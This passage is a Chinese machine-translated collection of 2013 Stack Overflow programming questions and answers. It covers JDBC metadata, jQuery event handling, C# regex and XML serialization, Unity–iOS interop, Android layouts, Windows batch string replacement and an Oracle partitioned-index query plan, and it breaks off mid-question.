**编辑：** 似乎它没有为 ODBC 驱动程序实现，您必须查看这篇文章如何使用 ODBC 驱动程序与 MS Access 数据库一起获取主键。 [这里](http://www.roseindia.net/answers/viewqa/JDBC/12952-Suns-JDBC-ODBC-driver-does-not-implement-the-getPrimaryKeys%28%29-method-for-the-DatabaseMetaData-Objects..html) 用于`meta.getIndexInfo(...)`获取主键

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:50:57.123

检索表的元数据很容易。你在你的桌子上构造一个`SQL`并执行它。从结果`ResultSet`中，您可以检索`MetaDataResultSet`其中包含字段名称、字段类型等内容`nullable and autoincrement`：试试这个：

```
 ResultSet set =stmt.executeQuery(sql);//stmt is your Prepared or Callable Statement object
    ResultSetMetaData resultMeta = set.getMetaData();
     for (int i=1;i< =resultMeta.getColumnCount();i++)
     {
      String fieldName = resultMeta.getColumnName(i);
       int type = resultMeta.getColumnType(i); // java.sql.Types
       Class _fieldType = convertType(type);
       boolean nullable = resultMeta.isNullable(i)!=java.sql.ResultSetMetaData.columnNoNulls;
       boolean isAutoincrement = resultMeta.isAutoIncrement(i);
        System.out.printf("Field: %s, %s, nullable %b, autoincrement
       %b%n",fieldName,_fieldType.getName(),nullable,isAutoincrement);
     } 
```

该类型在 java.sql.Types 中指定为整数常量。可以从可以从连接中检索的 DatabaseMetaData 中检索有关约束的信息。有3种方法：

`getPrimaryKeys(catalog,schema,table):`检索包含的 ResultSet；每个主键的每一列都有一个条目。

`getIndexInfo(catalog,schema,table,unique,false):`检索唯一索引和其他索引。您检索一个 ResultSet，其中包含每个索引的每一列的一个条目。如果 unique 为 false，则结果包含唯一键和非唯一键。

`getExportedKeys(catalog,schema,table):`检索包含所有外键的 ResultSet；每个键的每一列都有一个条目。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-12-31T05:52:13.270

//获取主键的列名

```
 DatabaseMetaData meta=conn.getMetaData();
      rs= meta.getTables(null, null, tablename, new String[]{"TABLE"});
      rs=meta.getPrimaryKeys(null, null, tablename);
      while(rs.next())
          System.out.println("Primery Key :"+rs.getString(4)); 
```

//还有外键约束

```
 rs=meta.getExportedKeys(null, null, tablename);
      while(rs.next())
          System.out.println("Foreign Key :"+rs.getString(4)); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-01-15T08:31:05.143

简单的解决方案：

```
 public String getPrimaryKey(String table) throws SQLException
  { 
    con = null;
    con = DriverManager.getConnection("jdbc:odbc:DRIVER={Microsoft Access Driver (*.mdb)};DBQ=//access_file_path/database_name.mdb", "username", "password");   
    Statement stmt = con.createStatement();
    ResultSet rs = stmt.executeQuery("SELECT * FROM "+table);
    ResultSetMetaData rsmd = rs.getMetaData();
    int cols = rsmd.getColumnCount(); 
    String primaryKey_columnName = "";
    boolean isAutoIncrement;

    for(int x = 1;x<=cols;x++){
        isAutoIncrement = rsmd.isAutoIncrement(x);
        if(isAutoIncrement){
           primaryKey_columnName = rsmd.getColumnName(x);
          }
      } 
     rs.close();
     con.close();

     return primaryKey_columnName;    
  } 
```

# javascript - 如何修改引导轮播 javascript 文件以便它可以触发此功能？

> ID：15357531
> 
> 赞同：0
> 
> 时间：2013-03-12T09:30:18.270
> 
> 标签：javascript, jquery, css, twitter-bootstrap

```
$(".carousel-inner img").load(function(){
    var pic_height = $(this).height();
    var should_height = $(this).parents('.item').height();
    var pad = (should_height - pic_height ) / 2;
    $(this).css('margin-top',pad);
}); 
```

此函数使用 javascript 将图像垂直居中到其父 div。

之后我立即尝试这样做`.carousel()`。但是，我意识到只有第一张图像垂直居中，其余的都搞砸了，因为图像还没有“加载”（因此使 pic_height 为 0）。

我的解决方案是在轮播转到下一张幻灯片后立即调用此函数。

但是，我不熟悉引导 javascript 文件。我在哪里添加这个功能？如何让它触发这个功能？

我**不**想要一个 CSS 解决方案。由于我对 css 的要求，纯 css 解决方案将不起作用。（我已经尝试了书中关于纯 css 垂直对齐的所有技巧，但我的情况不起作用。）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:35:55.153

我认为您可以像这样将每个图像放置在 dom 上：

```
$(".carousel-inner img").each(function(i, e){
    var pic_height = $(e).height();
    var should_height = $(e).parents('.item').height();
    var pad = (should_height - pic_height ) / 2;
    $(e).css('margin-top',pad);
}); 
```

如果你想在幻灯片上触发它，引导轮播提供以下事件：

> *   slide ：调用幻灯片实例方法时立即触发此事件。
>     
>     
> *   slid ：当轮播完成幻灯片转换时触发此事件。

翻译成 jQuery 会是：

```
$('.carousel').on('slide', function(e) { /* your code */ }); 
```

# c# - 使用正则表达式 C# 双输入替换为空格

> ID：15357533
> 
> 赞同：0
> 
> 时间：2013-03-12T09:30:25.583
> 
> 标签：c#, regex

我的情况是这样的：

```
1:3 And God said, Let there be light: and there was light.</p>

<p>And God saw the light, that it was good: and God divided the light from the darkness. 
```

我想在 C# 中使用正则表达式将这 2 行与空格合并为一行

我用了

```
 var p = Regex.Match(line, @”&lt;/p>\n\n<p>[A-z]“);
 if (p.Success)
 {
     MessageBox.Show(p.Value);
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:34:03.750

不需要正则表达式。尝试

```
line = line.Replace("\n\n", " "); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:32:44.527

您需要使用`Regex.Replace`：

```
Regex.Replace(line, @"</p>\n\n<p>", " "); 
```

但是，更简单的方法是：

```
Regex.Replace(line, @"(</?p>|\s)+", " "); 
```

对于该文本中有多少换行符或哪种换行符，这也更加稳健。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:33:26.627

为什么需要正则表达式？你可以简单地使用`s = s.Replace("\n\n", " ");`

# ios - 如何将 byte[] 的数据从本机 ios（插件代码）传递到 c# unity？

> ID：15357544
> 
> 赞同：1
> 
> 时间：2013-03-12T09:31:04.860
> 
> 标签：ios, unity3d, unmanaged, managed

我在 ios 插件中有这个本机代码：

```
int _mergeImage(const unsigned char* imageBackground, 
          int backgroundArraySize, int backgroundWidth, int backgroundHeight, 
          const unsigned char* imageForeground, int foregroundArraySize, 
          int foregroundTopLeftX, int foregroundTopLeftY, 
          int foregroundWidth, int foregroundHeight, 
          void* dataPtr){
CGDataProviderRef provider = CGDataProviderCreateWithData(NULL, imageBackground, backgroundArraySize, NULL);
CGImageRef backImageRef = CGImageCreateWithPNGDataProvider(provider, NULL, false, kCGRenderingIntentDefault);

CGDataProviderRef foregroundProvider = CGDataProviderCreateWithData(NULL, imageForeground, foregroundArraySize, NULL);
CGImageRef foreImageRef = CGImageCreateWithPNGDataProvider(foregroundProvider, NULL, false, kCGRenderingIntentDefault);

UIImage* uiImageBack = [UIImage imageWithCGImage:backImageRef];
UIImage* uiImageFore = [UIImage imageWithCGImage:foreImageRef];

UIGraphicsBeginImageContext(CGSizeMake(backgroundWidth, backgroundHeight));

[uiImageBack drawInRect:CGRectMake(0, 0, backgroundWidth, backgroundHeight)];
[uiImageFore drawInRect:CGRectMake(foregroundTopLeftX, foregroundTopLeftY, foregroundWidth, foregroundHeight)];
UIImage *result = UIGraphicsGetImageFromCurrentImageContext();
UIGraphicsEndImageContext();

NSData* data = UIImagePNGRepresentation(result);
NSLog(@"Background array size:%d and data.length:%d", backgroundArraySize, data.length);

dataPtr = data.bytes;
    NSLog(@"Done copying...Background array size:%d and data.length:%d", backgroundArraySize, data.length);
return data.length; 
```

}

然后我在 Unity 端有这段代码（在 C# 中）：

```
[DllImport("__Internal")]
    private static extern  int _mergeImage (byte[] imageBackground, int backgroundArraySize, 
 int backgroundWidth, int backgroundHeight,
 byte[] imageForeground, int foregroundArraySize, 
        int foregroundTopLeftX, int foregroundTopLeftY, 
 int foregroundWidth, int foregroundHeight, out IntPtr buff);

    private static byte[] MergeImage (byte[] imageBackground, int backgroundArraySize, 
                                int backgroundWidth, int backgroundHeight, byte[] imageForeground, int foregroundArraySize, 
                                int foregroundTopLeftX, int foregroundTopLeftY, int foregroundWidth, int foregroundHeight)
    {       
            Debug.Log ("Starting....");
            IntPtr unmanagedPtr = IntPtr.Zero;
            Debug.Log ("Calling");
            int length = _mergeImage (imageBackground, backgroundArraySize, backgroundWidth, backgroundHeight, imageForeground, 
                             foregroundArraySize, foregroundTopLeftX, foregroundTopLeftY, foregroundWidth, foregroundHeight, out unmanagedPtr);
            Debug.Log ("Done with length :" + length);  
            byte[] result = new byte[length];
            Debug.Log ("Copying.....");
            Marshal.Copy (unmanagedPtr, result, 0, length);
            Debug.Log ("Want to free it");
            Marshal.FreeHGlobal (unmanagedPtr);
            Debug.Log ("Done.....");
            return result;
    } 
```

我在调试控制台时收到此错误（之前的打印输出）：

```
Copying.....
ArgumentNullException: Argument cannot be null.
Parameter name: src
at System.Runtime.InteropServices.Marshal.Copy (IntPtr source, System.Byte[] destination, Int32 startIndex, Int32 length) [0x00000] in <filename unknown>:0     
at ImageUtilIOS.MergeImage (System.Byte[] imageBackground, Int32 backgroundArraySize, Int32 backgroundWidth, Int32 backgroundHeight, System.Byte[] imageForeground, Int32 foregroundArraySize, Int32 foregroundTopLeftX, Int32 foregroundTopLeftY, Int32 foregroundWidth, Int32 foregroundHeight) [0x00000] in <filename unknown>:0 
at ImageUtilIOS.MergeImage (System.Byte[] imageBackgroundPNG, Vector2 backgroundDimension, System.Byte[] imageForegroundPNG, Vector4 foregroundBound) [0x00000] in <filename unknown>:0 
```

关键是：我想将本地代码中处理后的图像的字节[]传递给c#

# javascript - 如何使用 jquery 从 HTML 元素中删除特定事件回调？

> ID：15357546
> 
> 赞同：8
> 
> 时间：2013-03-12T09:31:22.487
> 
> 标签：javascript, jquery, events

我在网页中有一个元素，上面有几个回调

```
// First callback
$("#element").click(fn1);

// Second callback
$("#element").click(fn2);

// Definitions
function fn1(){console.log("1");}
function fn2(){console.log("2");} 
```

有没有办法从 jQuery 触发的回调列表中只删除 fn2。我知道我可以在函数中添加一个“if”和一些全局变量，但这不是我想要的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-12T09:34:00.793

[unbind](http://api.jquery.com/unbind/)函数中的第二个参数指定要取消绑定的处理程序。

```
$("#element").unbind("click", fn2); 
```

**工作示例：http:** [//jsfiddle.net/k73Nx/](http://jsfiddle.net/k73Nx/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-12T10:08:53.343

有趣的是还没有人提到命名空间。这有什么原因吗？

附加事件时，您可以为其命名。而不是`$(elem).on('click', fn)`您将命名空间添加到单击事件。`$(elem).on('click.namespaced', fn)`

取消绑定后，您也可以使用命名空间取消绑定该确切事件。 `$(elem).off('click.namespaced')`

当您内联定义事件函数时，这是最实用的。

您可以使用命名空间做的另一件事是，只需一次调用即可取消绑定命名空间中的所有事件类型：`$(elem).off('.namespaced')`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-12T09:41:36.980

请注意您的语法，其他答案与他们的答案非常松散。

如果您使用：

```
$('#element').on('click',function() {
 //callback code
}); 
```

然后你必须使用：

```
$('#element').off('click'); 
```

你**不能**使用

```
$('body').off('click','#element',function() { }); 
```

或者

```
$(document).off('click','#element',function() { }); 
```

因为您最初将事件绑定到#element，而不是文档或正文。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-12T09:34:48.743

使用解绑： http: [//api.jquery.com/unbind/](http://api.jquery.com/unbind/)

例子：

```
$(document).unbind('click', fn2); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-12T09:35:47.417

使用 .off

```
 $("#element").off("click",fn2); 
```

[工作小提琴](http://jsfiddle.net/bipen/y93nK/)

# c# - Entity Framework 4 POCO 生成无法解析 System.Guid

> ID：15357547
> 
> 赞同：2
> 
> 时间：2013-03-12T09:31:25.573
> 
> 标签：c#, entity-framework, poco, t4

我正在为 EF4 使用 POCO 生成。当代码为我的一个字段生成时，`Guid`我得到了。

```
public virtual System.Guid MyProp
{
  get;
  set;
} 
```

这个词`Guid`有下划线。随着错误

> 无法解析符号 Guid

如果我将代码更改为：

```
public virtual Guid MyProp
{
  get;
  set;
} 
```

一切正常。锄头我可以解决我的问题，以便生成的代码不会出错。

# symfony - Symfony2 access_control，匹配所有包含某个单词的路由

> ID：15357548
> 
> 赞同：3
> 
> 时间：2013-03-12T09:31:25.537
> 
> 标签：symfony

以下仅匹配以 开头的路径`private`：

```
access_control:
    #...
    - { path: ^/private, roles: IS_AUTHENTICATED_ANONYMOUSLY, ip: 127.0.0.1 }
    - { path: ^/private, roles: ROLE_NO_ACCESS } 
```

如何匹配包含`/private/`（不一定以 开头`private`）的所有路由？例如，匹配`/message/private/blabla`的东西 .. 相当于[jQuery 选择](http://api.jquery.com/category/selectors/)`[path~="private"]`器。

***注意：***有谁知道我们如何称呼我们在这里使用的正则表达式？这是特定于 yml 还是由 Symfony 实现的，我很困惑。有没有机会我在文档中的某个地方错过了这个，我的意思是具有特定匹配模式的描述，如开头、结尾、包含等......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T10:28:19.293

`^/`此模式表示以 ( `^`) 开头的所有内容，斜线 ( `/`) 等等。

我想那`/private`或类似的东西`*/private`应该可以

# wso2 - 使用 Developer Studio 在 BPEL 中导入 WSDL 失败

> ID：15357550
> 
> 赞同：1
> 
> 时间：2013-03-12T09:31:33.410
> 
> 标签：wso2, wso2developerstudio

嗨，我正在使用 WSO2 开发人员工作室工作 BPEL。我正在尝试使用它的 wsdl 1.1 调用部署在 WSO2-AS 中的 Web 服务。

在 BPEL 编辑器中，我添加了一个合作伙伴链接（使用调色板中的 + 按钮） 在属性窗口中，我单击 Browse，然后在弹出窗口中单击 Add WSDL 按钮。在那里我选择了 URL 单选按钮并粘贴了我的轴服务的 wsdl 1.1 url。但该服务未导入。

我尝试使用 WSDL 2.0 url，然后它也失败了。（我尝试了 Axis 和 Jax-ws ）

然后我尝试使用 netbeans 导入部署在 tomcat 中的 Web 服务 (jax-ws) 的 wsdl url。它工作得很好。

你能帮我理解这个问题吗？

在此先感谢 Sunil Binkam

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-14T07:42:16.037

WSO2 BPS bpel 包要求所有工件位于同一位置。因此，最简单的方法是将 wsdl 文件从浏览器复制到 bpel 项目文件夹中，然后单击刷新。然后您可以从开发人员工作室导入 wsdl。

谢谢南迪卡

# android-layout - 如何在 RelativeLayout 中将 LinearLayout 居中？

> ID：15357552
> 
> 赞同：10
> 
> 时间：2013-03-12T09:31:40.440
> 
> 标签：android-layout, android-linearlayout, android-relativelayout

我想在 RelativeLayout 中将 LinearLayout 居中，但我有一个问题，margin-bottom 保持连接到底部。这是视图：

[http://nsa33.casimages.com/img/2013/03/12//130312103139937791.png](http://nsa33.casimages.com/img/2013/03/12//130312103139937791.png)

这是布局的代码：

```
<?xml version="1.0" encoding="utf-8"?>
     <RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
         android:id="@+id/group_layout"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
         android:background="@color/white"
         android:orientation="vertical" >

         <RelativeLayout
             android:id="@+id/carreGlobalInterieur"
             android:layout_width="fill_parent"
             android:layout_height="wrap_content"
             android:layout_margin="5dp"
             android:background="@color/grisTresClair" >

             <LinearLayout
                 android:layout_width="fill_parent"
                 android:layout_height="wrap_content"
                 android:background="@drawable/border_deals"
                 android:orientation="vertical" >

                     <RelativeLayout
                         android:id="@+id/GroupLigneOne"
                         android:layout_width="fill_parent"
                         android:layout_height="wrap_content"
                         android:layout_marginTop="8dp" >

                         <LinearLayout
                             android:layout_width="wrap_content"
                             android:layout_height="wrap_content"
                             android:background="@color/grisClair"
                             android:orientation="vertical" >

                             <TextView
                                 android:id="@+id/CategorieDeal"
                                 android:layout_width="wrap_content"
                                 android:layout_height="wrap_content"
                                 android:layout_marginLeft="5dp"
                                 android:layout_marginRight="5dp"
                                 android:text="My Category"
                                 android:textColor="@color/white" />

                         </LinearLayout>

                         <LinearLayout
                             android:layout_width="wrap_content"
                             android:layout_height="wrap_content"
                             android:layout_alignParentRight="true" >

                             <TextView
                                 android:id="@+id/nouveauPrixVert"
                                 android:layout_width="wrap_content"
                                 android:layout_height="wrap_content"
                                 android:text="10.99 €"
                                 android:textColor="@color/green"
                                 android:textStyle="bold" />

                             <TextView
                                 android:id="@+id/ancienPrixRouge"
                                 android:layout_width="wrap_content"
                                 android:layout_height="wrap_content"
                                 android:layout_marginLeft="7dp"
                                 android:layout_marginRight="6dp"

                                 android:text="20.90 €"
                                 android:textAppearance="?android:attr/textAppearanceMedium"
                                 android:textColor="@color/red"
                                 android:textSize="13sp"
                                 android:textStyle="bold" />

                             <TextView
                                 android:id="@+id/reductionPrix"
                                 android:layout_width="wrap_content"
                                 android:layout_height="wrap_content"
                                 android:layout_marginRight="4dp"

                                 android:text="(-34%)"
                                 android:textColor="@color/red"
                                 android:textStyle="bold" />

                         </LinearLayout>

                     </RelativeLayout>

                 <LinearLayout
                     android:id="@+id/ligneTwo"
                     android:layout_width="fill_parent"
                     android:layout_height="wrap_content"
                     android:layout_gravity="center"
                     android:layout_marginLeft="3dp"
                     android:orientation="vertical" >

                     <TextView
                         android:id="@+id/titreEnGros"
                         android:layout_width="fill_parent"
                         android:layout_height="fill_parent"
                         android:layout_gravity="center"
                         android:layout_marginTop="3dp"
                         android:text="Here is an example of a compleete title in a TextView Android"
                         android:textAppearance="?android:attr/textAppearanceMedium"
                         android:textColor="@color/black"
                         android:textSize="16sp" />

                 </LinearLayout>

                 <RelativeLayout
                     android:id="@+id/ligneFour"
                     android:layout_width="wrap_content"
                     android:layout_height="wrap_content"
                     android:layout_marginLeft="3dp"
                     android:orientation="vertical" >

                     <TextView
                         android:id="@+id/dateAjout"
                         android:layout_width="wrap_content"
                         android:layout_height="wrap_content"
                         android:layout_marginLeft="5dp"

                         android:text="il y a 2 heures" />

                     <TextView
                         android:id="@+id/siteWeb"
                         android:layout_width="wrap_content"
                         android:layout_height="wrap_content"
                         android:layout_alignParentRight="true"
                         android:layout_marginRight="5dp"

                         android:text="Amazon" />

                 </RelativeLayout>

             </LinearLayout>

         </RelativeLayout>

</RelativeLayout> 
```

如果您有一些想法将块居中，请帮助我！

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2013-03-12T14:47:08.020

使用 时`RelativeLayout`，您可以使用`android:layout_centerInParent="true"`，它会按照它所说的那样，将其居中在其父级中。

# string - 读取多个文本文件并使用批处理文件替换每个文本文件中的某种类型的字符串

> ID：15357554
> 
> 赞同：0
> 
> 时间：2013-03-12T09:31:44.137
> 
> 标签：string, batch-file, replace

我需要从一个目录中读取所有文本文件，然后在每个文件中用另一个字符串（替换为）替换某种类型的字符串（在具有“volumelabel”的行中）。以下是代码片段：

```
for /r %%g in (*.txt) do (
 set filename=%%~nxg
 for /F "tokens=3 delims=<>" %%i in ('findstr "volumelabel" !filename!') do (
  set tobereplaced=%%i
 )
 echo !filename! has !tobereplaced! to be replaced by %replacewith%
 for /F "tokens=*" %%a in (!filename!) do (
  set str=%%a
  set str=!str:!tobereplaced!=%replacewith%!
  echo !str!>>new!filename!
 )
) 
```

现在我面临的问题是它只`tobereplaced`（字面上）在新文件的每一行中打印

```
set str=!str:!tobereplaced!=%replacewith%!
echo !str!>>new!filename! 
```

使用并打印`tobereplaced=replacewith`（值）时

```
set str=%str:!tobereplaced!=%replacewith%%
echo !str!>>new!filename! 
```

用来。有人能帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T12:41:32.773

最不复杂的解决方案（以我的拙见）是使用子程序来`set str`. 超过一级的延迟扩张往往会导致严重的脑损伤。哦，您可能可以`set str`通过执行以下操作来修复您的线路

```
call call call set str=%%%%str:%%tobereplaced%%=%replacewith%%%%% 
```

...或类似的。明白我说的脑损伤是什么意思吗？很难遵循递归。

所以这是我对解决方案的建议。我还解决了另一个或两个潜在问题。由于您正在对 *.txt 进行递归搜索，因此我使`for`循环能够处理它们在子目录中找到的任何文本文件。我还没有对此进行测试，所以如果您遇到任何奇怪的错误，请告诉我。

```
@echo off
setlocal enabledelayedexpansion
set replacewith=whatever

for /r %%g in (*.txt) do (
    set newfile=%%~dpng.new%%~xg
    for /F "tokens=3 delims=<>" %%i in ('findstr "volumelabel" "%%g"') do (
        set "tobereplaced=%%i"
        echo %%~nxg has !tobereplaced! to be replaced by %replacewith%

        rem combining your for loops this way makes the second only fire if the first is true
        rem using "findstr /n" in your for loop preserves blank lines
        for /F "delims=" %%a in ('findstr /n "^" "%%g"') do (

            rem ...but you have to strip off the line numbers
            set "str=%%a" && set "str=!str:*:=!"

            rem "call :repl" to work around the delayed expansion conundrum
            call :repl "!str!" "!tobereplaced!" "%replacewith%" str
            echo !str!>>!newfile!
        )
    )
)
goto :EOF

:repl <line> <find> <replace> <var>
setlocal enabledelayedexpansion
set "line=%~1"
set "line=!line:%~2=%~3!"
set "%4=%line%"
goto :EOF 
```

警告：如果您的文本文件包含感叹号、等号或克拉，它们可能不会进入 textfile.new.txt。

* * *

对于它的价值，如果我在你的位置，而不是使用批处理文件，我可能会使用[sed](http://gnuwin32.sourceforge.net/packages/sed.htm)（二进制文件应该是你所需要的）。你甚至不需要脚本。你可以像这样作为一个班轮来做：

```
for /r %I in (*.txt) do sed -r "s/volumelabel/replacement/ig" "%I" > "%~dpnI.new%~xI" 
```

顺便说一句，有关这种符号`help for`的解释，请参阅最后几页。`%~dpnI`

# c# - 添加根元素属性

> ID：15357559
> 
> 赞同：0
> 
> 时间：2013-03-12T09:31:53.360
> 
> 标签：c#, .net, xml, xml-serialization

我正在序列化一个像下面这样的类

```
 XmlSerializerNamespaces namespaces = new XmlSerializerNamespaces();
 namespaces.Add(string.Empty, string.Empty);
 StringWriter sw = new StringWriter();
 XmlSerializer serializer1 = new XmlSerializer(typeof(List<student>), new XmlRootAttribute("Response"));
 XmlTextWriter xmlWriter = new XmlTextWriter(sw);
 serializer1.Serialize(xmlWriter, ls, namespaces);
 sw.ToString() 
```

下面的结果字符串

```
<?xml version="1.0" encoding="utf-16"?>
<Response><student><name>xxx</name></student></Response> 
```

但是，如何向根元素（响应）添加属性？像下面一个

```
<?xml version="1.0" encoding="utf-16"?>
<Response status="1"><student><name>xxx</name></student></Response> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T09:43:01.470

您只需要使用 XmlAttribute 标记该类的属性，即

```
class MyClass{
[XmlAttribute("status")]
public string ErrorStatus { get; set; }
} 
```

编辑：

刚刚意识到您正在直接序列化列表。将您的列表放入父类 Response 中，并将上述属性添加到此 Response 类，然后序列化 Response 对象。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T21:51:04.893

您可以创建另一个包含该列表的对象，然后创建一个属性以将该属性添加到根节点。

诀窍是在这个新类中的列表前加上对 Student 类型的显式类型分配，以避免将列表嵌套在另一个父节点中。

```
[XmlType(TypeName = "Response")]    
public class ResponseObject
{
    [XmlAttribute("status")]        
    public string file { get; set; }

    [XmlElement("Student", Type = typeof(Student))]
    public List<Student> studentList { get; set; }
} 
```

您的代码将如下所示

```
XmlSerializerNamespaces namespaces = new XmlSerializerNamespaces();
namespaces.Add(string.Empty, string.Empty);
StringWriter sw = new StringWriter();
XmlSerializer serializer1 = new XmlSerializer(typeof(ResponseObject));
XmlTextWriter xmlWriter = new XmlTextWriter(sw);

//Creating new object and assign the existing list and status
ResponseObject resp = new ResponseObject();
resp.studentList = ls;
resp.status = 1;

//Serialize with the new object
serializer1.Serialize(xmlWriter, resp, namespaces);
sw.ToString() 
```

# c# - 断言非常基本

> ID：15357560
> 
> 赞同：1
> 
> 时间：2013-03-12T09:31:53.527
> 
> 标签：c#, .net, nunit

我正在从两个文件中读取内容，现在我想用我预期的字符串测试该内容。

```
string read1 = File.ReadAllText("@C:\somefile.txt");
string read2 = File.ReadAllText("@C:\somefilee.txt");

string expectedString = "blah";

Assert.AreEqual(read1 and read2 equals expected ); 
```

我知道这是基本的，但我有点卡在这里。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-12T09:36:32.183

您需要使用 2 个断言，首先将预期字符串与第一个文件内容进行比较，然后将第二个文件内容与第一个文件内容（或再次与预期字符串）进行比较，例如：

```
Assert.AreEqual(expectedString, read1, "File content should be equal to expected string");
Assert.AreEqual(read1, read2, "Files content should be identical"); 
```

或者你可以使用条件

```
Assert.IsTrue(read1 == read2 == expectedString, "Files content should be equal to expected string"); 
```

但是在这种情况下，如果测试失败，您将不知道问题出在哪里。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-12T09:36:24.753

我更喜欢使用纯 C# 来编写这样的断言，你可以使用[ExpressionToCode](http://code.google.com/p/expressiontocode/) ( [nuget package](https://www.nuget.org/packages/ExpressionToCodeLib/) )。这样，您的断言将如下所示：

```
PAssert.That(
    () => read1 == expectedString && read2 == expectedString
    , "optional failure message"); 
```

失败时，库将在其输出中包含该表达式，并包含您使用的各种变量（read1、read2 和 expectedString）的实际值。

例如，您可能会遇到如下所示的失败：

```
可选的失败消息
读取 1 == 预期字符串 && 读取 2 == 预期字符串
  | | | | | | |
  | | | | | | “废话”
  | | | | | 错误的
  | | | | “废话”
  | | | 错误的
  | | “废话”
  | 真的
  “废话”

```

免责声明：我写了 ExpressionToCode。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-12T09:37:47.640

`Assert(read1 == read2 && read1 == expectedString, "Not all equal")`

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-03-12T09:36:41.087

如果我说对了，你想要这个：

```
try{
if(Assert.AreEqual(read1,read2,false)){
//do things
}
catch(AssertFailedException ex){
//assert failed
} 
```

[在此处](http://msdn.microsoft.com/de-de/library/ms243448.aspx)查找MSDN。

# sql - 按本地索引分页的 Oracle 计划中每个分区缺少 STOPKEY

> ID：15357571
> 
> 赞同：24
> 
> 时间：2013-03-12T09:32:26.120
> 
> 标签：sql, oracle, prepared-statement, partitioning, sql-execution-plan

有下一个分区表：

```
CREATE TABLE "ERMB_LOG_TEST_BF"."OUT_SMS"(
    "TRX_ID" NUMBER(19,0) NOT NULL ENABLE,
    "CREATE_TS" TIMESTAMP (3) DEFAULT systimestamp NOT NULL ENABLE,
    /* other fields... */
) PCTFREE 10 PCTUSED 40 INITRANS 1 MAXTRANS 255
  STORAGE(BUFFER_POOL DEFAULT FLASH_CACHE DEFAULT CELL_FLASH_CACHE DEFAULT)
  TABLESPACE "ERMB_LOG_TEST_BF"
  PARTITION BY RANGE ("TRX_ID") INTERVAL (281474976710656)
  (PARTITION "SYS_P1358"  VALUES LESS THAN (59109745109237760) SEGMENT CREATION IMMEDIATE
  PCTFREE 10 PCTUSED 40 INITRANS 1 MAXTRANS 255
  NOCOMPRESS LOGGING
  STORAGE(INITIAL 8388608 NEXT 1048576 MINEXTENTS 1 MAXEXTENTS 2147483645
  PCTINCREASE 0 FREELISTS 1 FREELIST GROUPS 1
  BUFFER_POOL DEFAULT FLASH_CACHE DEFAULT CELL_FLASH_CACHE DEFAULT)
  TABLESPACE "ERMB_LOG_TEST_BF");

CREATE INDEX "ERMB_LOG_TEST_BF"."OUT_SMS_CREATE_TS_TRX_ID_IX" ON "ERMB_LOG_TEST_BF"."OUT_SMS" ("CREATE_TS" DESC, "TRX_ID" DESC)
    PCTFREE 10 INITRANS 2 MAXTRANS 255
    STORAGE(
    BUFFER_POOL DEFAULT FLASH_CACHE DEFAULT CELL_FLASH_CACHE DEFAULT) LOCAL
    (PARTITION "SYS_P1358"
    PCTFREE 10 INITRANS 2 MAXTRANS 255 LOGGING
    STORAGE(INITIAL 65536 NEXT 1048576 MINEXTENTS 1 MAXEXTENTS 2147483645
    PCTINCREASE 0 FREELISTS 1 FREELIST GROUPS 1
    BUFFER_POOL DEFAULT FLASH_CACHE DEFAULT CELL_FLASH_CACHE DEFAULT)
    TABLESPACE "ERMB_LOG_TEST_BF"); 
```

我有 sql 查询，它选择按日期和事务排序的 20 条记录：

```
select rd from (
    select /*+ INDEX(OUT_SMS OUT_SMS_CREATE_TS_TRX_ID_IX) */ rowid rd
    from OUT_SMS     
    where  TRX_ID between 34621422135410688 and 72339069014638591       
       and CREATE_TS between to_timestamp('2013-02-01 00:00:00', 'yyyy-mm-dd hh24:mi:ss') 
                         and to_timestamp('2013-03-06 08:57:00', 'yyyy-mm-dd hh24:mi:ss')       
    order by CREATE_TS DESC, TRX_ID DESC
) where rownum <= 20 
```

Oracle 已生成下一个计划：

```
 -----------------------------------------------------------------------------------------------------------------------------------
    | Id  | Operation                   | Name                        | Rows  | Bytes |TempSpc| Cost (%CPU)| Time     | Pstart| Pstop |
    -----------------------------------------------------------------------------------------------------------------------------------
    |   0 | SELECT STATEMENT            |                             |    20 |   240 |       |  4788K  (1)| 00:05:02 |       |       |
    |*  1 |  COUNT STOPKEY              |                             |       |       |       |            |          |       |       |
    |   2 |   VIEW                      |                             |   312M|  3576M|       |  4788K  (1)| 00:05:02 |       |       |
    |*  3 |    SORT ORDER BY STOPKEY    |                             |   312M|     9G|    12G|  4788K  (1)| 00:05:02 |       |       |
    |   4 |     PARTITION RANGE ITERATOR|                             |   312M|     9G|       |    19   (0)| 00:00:01 |     1 |    48 |
    |*  5 |      COUNT STOPKEY          |                             |       |       |       |            |          |       |       |
    |*  6 |       INDEX RANGE SCAN      | OUT_SMS_CREATE_TS_TRX_ID_IX |   312M|     9G|       |    19   (0)| 00:00:01 |     1 |    48 |
    -----------------------------------------------------------------------------------------------------------------------------------

    Predicate Information (identified by operation id):
    ---------------------------------------------------

    1 - filter(ROWNUM<=20)
    3 - filter(ROWNUM<=20)
    5 - filter(ROWNUM<=20)
